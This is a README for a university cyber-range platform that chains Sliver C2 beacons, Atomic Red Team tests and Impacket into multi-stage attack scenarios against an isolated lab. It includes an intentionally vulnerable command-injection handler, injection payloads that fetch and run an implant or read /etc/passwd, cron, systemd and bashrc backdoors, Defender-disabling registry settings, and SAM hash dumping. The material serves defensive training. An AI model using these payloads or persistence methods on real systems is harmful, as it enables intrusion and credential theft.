# Flexible Platform — Multi-Stage Attack Scenario Orchestrator

> A mentor-driven **cyber-range scenario constructor**: design a multi-stage attack chain (Initial Access → Execution → Persistence → Lateral Movement → Credential Access) in a browser, then execute it against live victims with a single click — no hands on the underlying C2 command line.

Built on [BishopFox Sliver](https://github.com/BishopFox/sliver) C2, the [MITRE ATT&CK Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) library, and a custom Go orchestration backend with a React web UI. Developed as an Industrial Project (SNE25-26, Master's in Security of Systems and Networks, Innopolis University) for client **Innostage**, extending their Cyberpolygon commercial cyber range used for SOC training, Red vs Blue exercises, and incident-response drills.

**Before this project:** attack chains were executed manually, one operator per scenario. **Now:** a mentor clicks one button and a predefined kill chain runs automatically across Linux and Windows victims.

---

## Table of Contents

- [What It Does](#what-it-does)
- [Architecture](#architecture)
- [Prerequisites](#prerequisites)
- [Quick Start](#quick-start)
- [Lab Environments](#lab-environments)
- [The Flagship Attack Chain](#the-flagship-attack-chain)
- [Honeypot — ResolvTech IP Resolver](#honeypot--resolvtech-ip-resolver)
- [Other Scenarios](#other-scenarios)
- [Atomic Red Team Integration](#atomic-red-team-integration)
- [Web UI](#web-ui)
- [REST API Reference](#rest-api-reference)
- [CLI Tools](#cli-tools)
- [Automation & Persistence](#automation--persistence)
- [Testing](#testing)
- [Troubleshooting](#troubleshooting)
- [Repository Structure](#repository-structure)
- [Limitations & Future Work](#limitations--future-work)
- [Team](#team)
- [License](#license)

---

## What It Does

The platform is delivered as two integrated components deployed against two complementary lab environments:

| Component | Stack | Role |
|---|---|---|
| **sliver-orchestrator** (backend) | Go, REST `/api/v1`, SSE, Sliver gRPC, SQLite + GORM | Defines, validates, and executes multi-stage chains against live implant sessions |
| **flexible-platform** (frontend) | React 18, TypeScript, Vite, Mantine, Redux Toolkit + RTK Query, React Flow | Visual scenario editor, atomics browser, live sessions, execution viewer |

### Key Capabilities

| Capability | Detail |
|---|---|
| **DAG chain engine** | Attack chains modelled as directed acyclic graphs; topological resolver validates order, rejects cycles and missing dependencies |
| **Three orchestration primitives** | Output capture (`output_extract` → `{{VarName}}`), conditional gating (skip ≠ failure), per-step session override |
| **Per-step session targeting** | A single chain can target multiple beacons on distinct victims via a `session_id` field per step (including one supplied by variable substitution) |
| **340 ATT&CK atomics** | Full Atomic Red Team library loaded on start; resolvable by GUID, name, or test index |
| **Five action types** | `command`, `atomic`, `upload`, `binary`, `sliver_rpc` |
| **Live SSE streaming** | Real-time step output in the web UI and CLI |
| **Bilingual UI** | English / Russian via i18next |
| **Reproducible labs** | Docker (single-host, <2 min) and Vagrant (multi-hop, auto-recovers across reboots) |

---

## Architecture

The Vagrant multi-hop lab reproduces the network segmentation of a real target environment: the C2 sits on a management network, the Linux victim acts as a pivot with a foot in both the management network and an isolated internal network, and the Windows target is reachable only from the pivot.

```
┌──────────────────────────────────────────────────────────────────┐
│  Windows Host (Physical) — VMware Workstation                    │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │  Kali Linux VM (12 GB RAM)                                 │  │
│  │  ┌──────────────────────────────────────────────────────┐  │  │
│  │  │  VirtualBox (nested)                                 │  │  │
│  │  │                                                      │  │  │
│  │  │  [C2 .56.5]──hostonly──[Linux Pivot .56.10/.16.10]  │  │  │
│  │  │                              │                       │  │  │
│  │  │                           intnet                     │  │  │
│  │  │                              │                       │  │  │
│  │  │                    [Win Target .16.20/.56.20]        │  │  │
│  │  └──────────────────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
```

### Network Segments

| Network | Subnet | Members | Purpose |
|---|---|---|---|
| `hostonly (vboxnet0)` | 192.168.56.0/24 | Kali, C2, Linux Pivot, Win Target | C2 communication, management |
| `intnet "sliver-lab"` | 172.16.1.0/24 | Linux Pivot, Win Target | Isolated internal network (lateral-movement path) |



### Virtual Machines

| VM | Vagrant Name | IPs | RAM | Role |
|---|---|---|---|---|
| C2-Orchestrator | `c2` | 192.168.56.5 | 2 GB | Sliver C2 server + scenario-server |
| Linux-Pivot | `linux_pivot` | 192.168.56.10, 172.16.1.10 | 1 GB | Attacker pivot, honeypot, HTTP implant server |
| Windows-Target | `win_target` | 172.16.1.20 | 6 GB | Victim Windows 10 (`gusztavvargadr/windows-10`) |

---

## Prerequisites

- **Host OS:** Windows with VMware Workstation (Kali VM inside)
- **Kali Linux** with: VirtualBox 7.x · Vagrant 2.4+ · Go 1.21+ · Node.js 18+ & npm · `jq`, `curl`

```bash
vagrant --version && vboxmanage --version && go version && node --version
```

---

## Quick Start

The frontend is tracked as a **git submodule**, so a fresh clone must recurse submodules or `flexible-platform/` comes down empty.

### Option A — One Command (Recommended)

```bash
git clone --recurse-submodules https://github.com/lcensies/sliver-orchestrator-workspace.git
cd sliver-orchestrator-workspace
git checkout sliver-orchestrator-dev
chmod +x setup.sh && ./setup.sh
```

`setup.sh` runs these steps automatically:

1. Check dependencies (vagrant, vboxmanage, go, node, npm, curl, jq)
2. Build the `scenario-server` binary (`make scenario`)
3. Boot VMs in order: c2 → (30s) → linux_pivot → (10s) → win_target
4. Wait for backend health (`/api/v1/health`)
5. Deploy scenario-server to the c2 VM
6. Import the Sliver operator config to Kali (`sliver-client import`)
7. Configure linux_pivot services (honeypot, svc-server auto-fetch, watchdog)
8. Install the Kali auto-boot service (`vagrant-lab.service`)
9. Sync 340 atomic techniques to `/opt/atomics/` on c2
10. Install frontend npm packages, then wait for Linux + Windows sessions (~3 min)

### Option B — Manual

```bash
cd sliver-orchestrator-workspace

# 1. Clean inaccessible VMs (after an unexpected shutdown/crash)
VBoxManage list vms | grep inaccessible | grep -oP "\{.*?\}" | tr -d "{}" | \
  xargs -I{} VBoxManage unregistervm {} 2>/dev/null || true

# 2. Boot VMs in the correct order
vagrant up c2 && sleep 30 && vagrant up linux_pivot && sleep 10 && vagrant up win_target

# 3. Wait for sessions (~3-5 minutes)
sleep 180
curl -s http://192.168.56.5:8080/api/v1/sessions | jq -r '.[] | "\(.os) \(.hostname) pid:\(.pid)"'
```

**Expected:**
```
linux   ubuntu-jammy    pid:634
windows DESKTOP-PSJFL91 pid:7352
```

### Start the Web UI

```bash
cd flexible-platform && npm run dev
# Open http://localhost:5173
```

---

## Lab Environments

Two deployments are produced. Pick by purpose:

| Lab | Topology | Use For |
|---|---|---|
| **Vagrant multi-hop** | 3 VirtualBox VMs (C2 + Linux pivot + Windows target), nested inside Kali | Full lateral-movement and credential-access chains; the flagship demo |
| **Docker** | Sliver C2 + scenario-server + single Linux beacon via Compose | Fast single-host backend/integration testing and end-to-end chain-executor validation |

The Docker lab reaches a working state in under two minutes; the Vagrant lab recovers automatically across Kali reboots via a systemd-orchestrated boot sequence.

---

## The Flagship Attack Chain

**File:** `examples/full-attack-chain-v2.yaml`
**Chain ID:** `cf1efcaf-62e3-4223-afcc-eecf13efddc1`
**Session:** Linux (primary) — assumes an active Sliver session on the pivot, obtained separately via the honeypot exploitation path
**Steps:** 14 | **Tactics:** discovery, persistence, lateral-movement, execution, credential-access

A fourteen-step chain modelling the post-initial-access half of a realistic multi-stage intrusion. Two deliberate design points:

- **Atomic vs command steps.** Well-defined discovery and persistence techniques (steps 1–5) execute genuine MITRE Atomic Red Team YAML tests by identifier, inheriting the community-maintained taxonomy. The lateral-movement and credential-access flow (steps 6–14) composes Impacket calls in a specific order for which no single atomic exists, so those steps are inline shell commands tagged with the closest MITRE identifier for traceability.
- **Sliver as transport, Impacket as tooling.** Each shell command is dispatched by the backend through Sliver's `Execute` gRPC to the pivot beacon; the pivot then invokes Impacket utilities (`wmiexec.py`, `secretsdump.py`) against the Windows target.

The chain runs to completion in **~60 seconds** against a warm Vagrant lab.

| Step | ID | Technique | MITRE | Description |
|---|---|---|---|---|
| 1 | `honeypot_recon` | Honeypot discovery | T1046 | Confirm fake camera HTTP 200 |
| 2 | `linux_sysinfo` | System info | T1082 | Linux OS / kernel / arch |
| 3 | `linux_network` | Network config | T1016 | Discover internal subnet |
| 4 | `cron_persistence` | Cron job | T1053.003 | Plant cron backdoor |
| 5 | `systemd_persistence` | Systemd service | T1543.002 | Create persistent service |
| 6 | `find_windows_host` | **Dynamic** host scan | T1046 | nmap → arp-scan → TCP sweep |
| 7 | `lateral_recon` | WMIExec lateral move | T1021.006 | Actual movement Linux → Windows |
| 8 | `win_sysinfo` | Windows recon | T1082 | Hostname via wmiexec |
| 9 | `deploy_implant` | Implant delivery | T1105 | Deploy `svc.exe` via scheduled task |
| 10 | `sam_dump` | SAM credential dump | T1003.002 | `secretsdump.py` → live NTLM hashes |
| 11 | `find_dc_candidate` | DC discovery | T1018 | Ports 88 / 389 / 445 / 3268 scan |
| 12 | `shadow_copy_vss` | VSS shadow copy | T1003.003 | `Win32_ShadowCopy.Create` POC |



**SAM dump — representative output (step 10):**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1001:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
```

Live NTLM hashes captured from the target SAM — evidence normally *simulated* in training scenarios, here reproducible from a clean boot. Hashes can be passed directly (Pass-the-Hash / T1550.002) or cracked offline.

### Run it (API)

```bash
LIN=$(curl -s http://192.168.56.5:8080/api/v1/sessions | \
  jq -r '.[] | select(.os=="linux") | .id' | tail -1)
EXEC=$(curl -s -X POST \
  http://192.168.56.5:8080/api/v1/chains/cf1efcaf-62e3-4223-afcc-eecf13efddc1/execute \
  -H 'Content-Type: application/json' \
  -d "{\"session_id\":\"$LIN\"}" | jq -r '.execution_id')
curl -N "http://192.168.56.5:8080/api/v1/executions/$EXEC/stream"
```

---

## Honeypot — ResolvTech IP Resolver

**File:** `(honeypot-service) main.go`

A **deliberately vulnerable** Go web server simulating a fictional "ResolvTech IP Resolver", running on the Linux pivot. Its DNS-lookup endpoint carries a command-injection vulnerability that provides the *initial access* path feeding the flagship chain.

### Vulnerability

The `query` parameter from `GET /resolve?query=<input>` is passed **unsanitised** to a shell command:

```go
// VULNERABILITY: unsanitised input passed directly to shell
cmd := exec.Command("sh", "-c", "nslookup "+query)
```

**Exploitation examples:**
```
GET /resolve?query=127.0.0.1;id
GET /resolve?query=8.8.8.8;cat /etc/passwd
GET /resolve?query=x;curl http://172.16.1.10:8000/svc.exe -o /tmp/svc.exe && chmod +x /tmp/svc.exe && /tmp/svc.exe
```

### Running on linux_pivot

Managed as a systemd service — starts on boot:

```bash
sudo systemctl status resolvtech
sudo systemctl start resolvtech
curl 'http://localhost:8080/resolve?query=127.0.0.1%3Bid'   # URL-encode the semicolon
```

**Proven injection output:**
```
ResolvTech IP Resolver - Result for: 127.0.0.1;id
;; communications error to 127.0.0.1#53: connection refused
uid=0(root) gid=0(root) groups=0(root)
```

Rebuild from source if the binary is lost:

```bash
sudo mount -o remount,rw / 2>/dev/null
export GOCACHE=/tmp/go-cache GOTMPDIR=/tmp
go build -o /usr/local/bin/resolvtech-honeypot /tmp/main.go
sudo systemctl restart resolvtech
```

> ⚠️ **Intentionally insecure. Do not deploy to production or expose to untrusted networks.**

---

## Other Scenarios

All scenarios live in `examples/`. Import via the UI or API. Session-selection guide:

| Scenario File | Run With | Purpose |
|---|---|---|
| `initial-access-full-chain.yaml` | **Run without session** | 15-step chain that captures its own session via command injection |
| `full-attack-chain-v2.yaml` | Linux | The 14-step flagship chain |
| `linux-full-chain.yaml` | Linux | Full Linux post-exploitation |
| `t1082-basic-discovery.yaml` | Windows or Linux | Single atomic — verify end-to-end connectivity |
| `win-discovery.yaml` | Windows | T1082 + T1016 atomics |
| `Linux Network Enumeration.yaml` | Linux | T1016 network config |
| `linux Internal host discovery.yaml` | Linux | Parallel ping sweep of 172.16.1.0/24 |
| `Quick Windows Service Discovery (SMB, SSH, WinRM).yaml` | Linux | Port scan Windows from pivot |
| `Probe second host from beacon (single session).yaml` | Linux | ICMP reachability probe |
| `lateral_movement.yml` | Linux → Windows | Session handoff via Impacket / `{{peer_session}}` |
| `Second beacon via per-step session_id.yaml` | Linux | Two victims in one chain |
| `lateral-inband-reachability.yaml` | Linux | ICMP path verification |
| `Bruteforce Winrm using defaults passwords wordlist.yaml` | Linux | Default-credential spray via WMIExec |

These single-purpose scenarios double as regression tests for the executor and as reusable building blocks mentors can compose into custom chains.

### Initial-Access Chain (starts from zero sessions)

**File:** `examples/initial-access-full-chain.yaml` · **Run without session** · 15 steps

Exploits the ResolvTech command injection to gain initial access, then runs a full Linux + Windows post-exploitation chain. Phase 0 `exploit_vulnweb` (T1190) delivers the beacon via inline Python and captures its own session via `output_extract`; subsequent phases cover foothold confirmation, network discovery, three persistence mechanisms (cron / systemd / bashrc), dynamic Windows host discovery, credential bruteforce against a default-password wordlist, WMIExec lateral movement, Windows recon (sysinfo + network config), implant delivery, SAM dump, DC discovery, and a VSS shadow-copy POC.

| Step | ID | Technique | MITRE | Description |
|---|---|---|---|---|
| 1 | `exploit_vulnweb` | Command injection → beacon | T1190 | Python: probe /resolve RCE, curl + exec implant, poll API until session appears |
| 2 | `confirm_foothold` | Foothold confirmation | T1082 | id / whoami / hostname / uname on captured session |
| 3 | `network_discovery` | Network config | T1016 | ip addr / ip route / ss — find internal subnet |
| 4 | `cron_persistence` | Cron job | T1053.003 | Plant /etc/cron.d backdoor |
| 5 | `systemd_persistence` | Systemd service | T1543.002 | Atomic T1543.002 test 0 |
| 6 | `bashrc_persistence` | Bashrc backdoor | T1546.004 | Append id logger to /root/.bashrc |
| 7 | `find_windows_host` | **Dynamic** host scan | T1046 | nmap → arp-scan → TCP sweep for port 445 on 172.16.x.x; extracts `{{win_ip}}` |
| 8 | `bruteforce_credentials` | Credential bruteforce | T1110.001 | Default password wordlist tested via WMIExec |
| 9 | `lateral_movement` | WMIExec lateral move | T1021.006 | Impacket wmiexec.py Linux pivot → Windows |
| 10 | `win_sysinfo` | Windows system info | T1082 | systeminfo via WMIExec |
| 11 | `win_network` | Windows network config | T1016 | ipconfig /all via WMIExec |
| 12 | `deploy_windows_implant` | Implant delivery | T1105 | Trigger WindowsUpdateHelper schtask → svc.exe |
| 13 | `credential_dump` | SAM credential dump | T1003.002 | secretsdump.py → live NTLM hashes |
| 14 | `find_dc_candidate` | DC discovery | T1018 | Port scan 88 / 389 / 445 / 3268 across subnet |
| 15 | `shadow_copy_vss` | VSS shadow copy | T1003.003 | Trigger VSSDump schtask via WMIExec |
```

---

## Atomic Red Team Integration

340 MITRE ATT&CK atomic techniques are loaded on start and available in the UI and API. Techniques resolve by GUID, name, or test index; user-supplied arguments are interpolated into the test's command template before dispatch.

```bash
curl -s http://192.168.56.5:8080/api/v1/atomics | jq 'length'   # → 340
curl -s http://192.168.56.5:8080/api/v1/atomics/T1082 | jq .
```

### Fetch & Update

```bash
./atomic/fetch.sh           # ZIP download (fast, default)
./atomic/fetch.sh --clean   # keep only the 33 curated techniques
./atomic/fetch.sh --git     # git sparse-checkout (alternative)

# Sync to c2 VM
vagrant ssh c2 -c "sudo rm -rf /opt/atomics && sudo mkdir -p /opt/atomics && \
  sudo cp -r /sliver-repo/atomic/T* /opt/atomics/"
vagrant ssh c2 -c "sudo systemctl restart scenario-server"
```

### Curated Technique List (33)

| Category | Techniques |
|---|---|
| Initial Access | T1078, T1190, T1566.001 |
| Execution | T1059.001, T1059.003, T1059.004, T1203 |
| Persistence | T1547.001, T1543.003, T1053.005 |
| Privilege Escalation | T1548.002, T1055, T1134 |
| Defense Evasion | T1027, T1562.001, T1070.001 |
| Credential Access | T1003.001, T1003.002, T1110.003, T1550.002 |
| Discovery | T1087, T1082, T1083, T1016, T1049 |
| Lateral Movement | T1021.001, T1021.002 |
| Collection | T1005, T1074 |
| Exfiltration | T1041, T1048 |
| Impact | T1486, T1490 |

---

## Web UI

At **http://localhost:5173** after `npm run dev` in `flexible-platform/`. Built with React 18 + TypeScript, Vite, Mantine, Redux Toolkit + RTK Query, and React Flow. The DAG viewer performs cycle and missing-dependency checks in the browser before a chain is sent to the backend; heavy dependencies (xterm.js, CodeMirror, React Flow) are lazy-loaded via `React.lazy()` to keep the bundle small. Bilingual (English / Russian) via i18next.

| Section | Features |
|---|---|
| **Dashboard** | Lab health, active session count, recent executions |
| **Scenarios** | List chains; run with session picker; edit, import/export YAML, clone |
| **Scenario Builder** | Add Step / Add Atomic; drag-and-drop ordering; General / Action / Conditions / Output-Vars tabs |
| **Step Editor** | Step ID, Name, On Failure, Depends On, Timeout, Session Override dropdown |
| **Session Override** | Per-step targeting — live dropdown of all alive sessions (OS / hostname / user / PID) |
| **Atomics** | Browse all 340; view test details; add directly to a scenario |
| **Sessions** | Live list (liveness-probed, deduplicated — 1 per hostname); implant builder panel |
| **Executions** | History with SSE live streaming, step stdout/stderr, status icons (xterm.js log) |

### Running Chains Without a Session

For chains that capture their own session, the session-picker modal has a **"Run without session"** button — it passes a dummy UUID and lets the chain's step create a session dynamically.

---

## REST API Reference

**Base URL:** `http://192.168.56.5:8080/api/v1`

```bash
# Sessions (liveness-probed, deduplicated 1 per OS:Hostname)
GET  /sessions

# Chains
GET    /chains                 # list
POST   /chains                 # create from YAML (Content-Type: application/yaml)
PUT    /chains/{id}            # update
DELETE /chains/{id}            # delete
POST   /chains/{id}/execute    # execute {"session_id":"<uuid>"}

# Executions
GET  /executions?chain_id={id} # list
GET  /executions/{id}          # detail with step results
GET  /executions/{id}/stream   # SSE real-time stream

# Atomics
GET  /atomics                  # all 340
GET  /atomics/{id}             # technique detail + tests

# Implants
GET  /implant/windows?c2=192.168.56.5
GET  /implant/linux?c2=192.168.56.5

# Health
GET  /health                   # → {"status":"ok","time":"..."}
```

---

## CLI Tools

### lab-run.py — Interactive Scenario Runner

```bash
pip install sseclient-py requests --break-system-packages
cd /home/kali/sliver-orchestrator
python3 lab-run.py
```

Presents a numbered menu of scenarios and live sessions — no UUIDs to copy.

### Sliver CLI

```bash
vagrant ssh c2 -- -q "sudo cat /etc/sliver/scenario-operator.cfg" > /tmp/op.cfg
sliver-client import /tmp/op.cfg
sliver-client
# inside: sessions · use <id> · execute -o "hostname" · download /tmp/svc.exe · background · exit
```

---

## Automation & Persistence

### Linux Pivot — Systemd Services

| Service | Purpose | Restart |
|---|---|---|
| `sliver-implant.service` | Linux C2 beacon | Always |
| `implant-watchdog.service` | Restarts beacon if not running (30s) | Always |
| `honeypot.service` | Fake Hikvision DS-2CD camera (port 8080) | Always |
| `resolvtech.service` | Vulnerable ResolvTech IP Resolver (port 8080) | Always, 5s |
| `svc-server.service` | HTTP server for Windows implant; auto-fetches `svc.exe` from C2 | Always, 30s |
| `remount-rw.service` | Remounts root rw on boot (for cron/profile.d persistence) | oneshot |

`svc-server` retries up to 20× at 30s intervals (≈10 min) to download `svc.exe` before serving.

### Windows Target — Scheduled Tasks & Registry

| Item | Type | Trigger | Action |
|---|---|---|---|
| `WindowsUpdateHelper` | Scheduled Task | AtLogOn (vagrant) | 20-retry download loop → Start-Process svc.exe |
| `WindowsDefenderCheck` | Scheduled Task | Every 5 min | Redownload + start svc.exe if not running |
| `SAMDump` | Scheduled Task | AtStartup | `reg save HKLM\SAM C:\Windows\Temp\sam.hive` |
| `VSSDump` | Scheduled Task | AtStartup | `Win32_ShadowCopy.Create("C:\","ClientAccessible")` |
| Auto-login | Winlogon registry | Boot | vagrant auto-login → fires AtLogOn tasks |
| Defender disabled | Registry policy | Permanent | `DisableAntiSpyware=1`, `DisableRealtimeMonitoring=1` |

### Kali Auto-Boot

`/etc/systemd/system/vagrant-lab.service` boots all VMs on Kali startup (`sleep 15 → c2 → 30s → linux_pivot → 10s → win_target`) and cleans inaccessible VirtualBox VMs first.

---

## Testing

Automated unit tests, end-to-end runs against the Vagrant lab, and integration tests against the Docker lab.

| Suite | Count | Coverage |
|---|---|---|
| Vitest (frontend) | 51 | DAG utils, YAML round-trip, formatUtils, executionSlice |
| Go tests (backend) | 4 | Condition evaluation, atomics loading |
| End-to-end scenarios | 13 | Docker + Vagrant labs |

**Notable defects fixed:** null tags crashing the editor (fixed via RTK Query response normalisation); execute-button double-submit (mutation `isLoading` guards); accidental `.env` commit (rotated, added `.env.example` + `.gitignore`); prod deployment failure (missing Vite proxy config); atomics path resolution from non-standard working directories.

---

## Troubleshooting

**Sessions not appearing after boot**
```bash
curl -s http://192.168.56.5:8080/api/v1/health
vagrant ssh linux_pivot -c "sudo systemctl status svc-server"
vagrant ssh linux_pivot -c "curl -s -o /dev/null -w '%{http_code}' http://172.16.1.10:8000/svc.exe"
vagrant winrm win_target -c "Start-ScheduledTask 'WindowsUpdateHelper'"
```

**VMs inaccessible**
```bash
VBoxManage list vms | grep inaccessible | grep -oP "\{.*?\}" | tr -d "{}" | \
  xargs -I{} VBoxManage unregistervm {} 2>/dev/null || true
vagrant up c2
```

**Persistence fails: "Read-only file system"**
```bash
vagrant ssh linux_pivot -c "sudo mount -o remount,rw / && echo remounted"
```

**svc-server returns 404**
```bash
vagrant ssh linux_pivot -c "sudo mount -o remount,rw / 2>/dev/null; sudo systemctl restart svc-server"
```

**Windows loses internet after restart**
```powershell
Set-NetIPInterface -InterfaceAlias "Ethernet" -Dhcp Enabled
ipconfig /release "Ethernet"; ipconfig /renew "Ethernet"
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses "8.8.8.8","1.1.1.1"
```

**Rebuild & redeploy scenario-server**
```bash
make scenario
vagrant ssh c2 -c "sudo systemctl stop scenario-server"
vagrant upload scenario-server /tmp/scenario-server c2
vagrant ssh c2 -c "sudo cp /tmp/scenario-server /usr/local/bin/scenario-server && \
  sudo chmod +x /usr/local/bin/scenario-server && sudo systemctl start scenario-server"
```

**Dead sessions clogging the list** — `sliver-client` → `sessions --clean`

---

## Repository Structure

```
sliver-orchestrator-workspace/
├── api/            server.go · chains.go · executions.go · atomics.go · implant.go
├── atomic/         fetch.sh · library.go · model.go · T*/ (340 ATT&CK YAMLs)
├── chain/          model.go (SessionID per-step) · executor.go (DAG engine) · condition.go
├── examples/       *.yaml scenarios (flagship: full-attack-chain-v2.yaml)
├── flexible-platform/   React UI — git submodule (TypeScript · Mantine · Vite · SSE)
│   └── src/        components/modals/ · pages/ScenarioEditor/ · types/chain.ts · hooks/
├── lab/provision/  c2-server.sh · victim-linux.sh · victim-windows.ps1
├── sliver/         client.go (gRPC wrapper) · executor.go (Execute RPC, 15-min timeout)
├── store/          db.go (SQLite) · models.go
├── (honeypot-service) main.go   # vulnerable ResolvTech IP Resolver
├── honeypot.py                  # fake Hikvision DS-2CD camera
├── Vagrantfile · Makefile · setup.sh · lab-run.py · go.mod · vendor/
```

---

## Limitations & Future Work

**Limitations.** Persistence uses SQLite (chains, executions, logs) — sized for a single-mentor lab. Larger deployments need a bigger database.

**Future work.**
- **Auto-detect target platform** for atomic steps — author supplies only the technique ID; the executor picks the test variant from the resolved session's OS.
- **Migrate to PostgreSQL** behind a driver flag, keeping SQLite as the single-host default (GORM makes this a config change).
- **Bearer-token auth** at the API + a login screen, enabling multi-tenant classroom deployment.
- **Parameterise Windows persistence artefacts** (task names, registry keys, implant URL, target user) so the flagship chain ports to other Windows targets without editing YAML.
- **Scenario-runner CLI as a proper Go binary** (replacing the `lab-run.py` prototype) for shell/CI integration.

---

## Team

Industrial Project · SNE25-26 · Master's in Security of Systems and Networks, Innopolis University · Client: **Innostage**

Nikita Niakhai · Mark Chausov · Hasib Al Tahsin · Khalid Maina · Victor Adekanye · Albert Avkhadeev · Alisa Evdosenko

---

## License

Educational use only. `(honeypot-service) main.go` is **intentionally vulnerable** — do not deploy to production or expose to untrusted networks.
